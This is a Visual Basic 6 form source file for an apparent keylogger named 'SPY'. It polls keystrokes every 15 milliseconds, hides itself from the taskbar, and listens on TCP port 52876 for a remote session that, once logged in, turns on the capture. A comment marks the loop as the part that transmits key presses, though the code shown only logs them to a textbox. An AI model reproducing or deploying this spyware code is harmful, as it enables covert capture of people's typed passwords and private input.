VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmSpyMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "SPY"
   ClientHeight    =   3825
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   4530
   Icon            =   "frmSpyMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   3825
   ScaleWidth      =   4530
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.TextBox txtStatus 
      Height          =   3615
      Left            =   120
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   120
      Width           =   4335
   End
   Begin VB.Timer SpyTimer 
      Interval        =   15
      Left            =   0
      Top             =   0
   End
   Begin MSWinsockLib.Winsock WSCK 
      Left            =   480
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemotePort      =   52876
   End
   Begin MSWinsockLib.Winsock WSCKUDP 
      Left            =   960
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
      RemotePort      =   52876
      LocalPort       =   52876
   End
End
Attribute VB_Name = "frmSpyMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Private Sub Form_Unload(Cancel As Integer)
WSCK_Close
End Sub

Private Sub SpyTimer_Timer()
Dim I As Integer
I = GetKey
If I > -1 And SocketLogin = 1 Then
    'This is the part that transmits key presses
    txtStatus.Text = Chr(I) & ":" & " : " & Str(I) & vbCrLf & txtStatus.Text
End If
End Sub

Private Sub AddStatus(Sts As String)
txtStatus.Text = txtStatus.Text + Sts + vbCrLf
End Sub

Private Sub WSKSetup()
WSCK.Protocol = sckTCPProtocol         'Using TCP/IP
WSCK.LocalPort = Val(WSCK.LocalIP)     'Using Set Port (Default: 52876)
WSCK.Bind WSCK.LocalPort, WSCK.LocalIP 'Binds Port/IP to ensure Listen
WSCK.Listen                            'Sets Socket to Listen ONLY
AddStatus ("Listening Mode...")        'Adds status of Listening Mode to status.
End Sub

Private Sub Form_Load()
WSKSetup                                'Initiates Winsock Setup Routines
End Sub

Private Sub WSCK_Close()
AddStatus ("Closing from: " & WSCK.RemoteHostIP)
ManualClose         'Closes and Cleans up Socket
WSKSetup
End Sub

Private Sub WSCK_ConnectionRequest(ByVal RequestID As Long)
AddStatus ("Connection request from: " & WSCK.RemoteHostIP)
WSCK.Accept RequestID
SocketSend StartSession & WSCK.LocalIP
End Sub

Private Sub WSCK_DataArrival(ByVal bytesTotal As Long)
Dim InData, SCode As String
WSCK.GetData InData, vbString
SCode = CodeCheck(InData)
InData = CodeLess(InData)

If SocketLogin = 0 Then      'All Actions made Before login
    Select Case SCode
        Case StartSession
            SocketLogin = 1      'Sets Login Success
    End Select
Else                         'All Actions made After login
    Select Case SCode
        Case EndSession
            WSCK_Close
    End Select
End If
End Sub
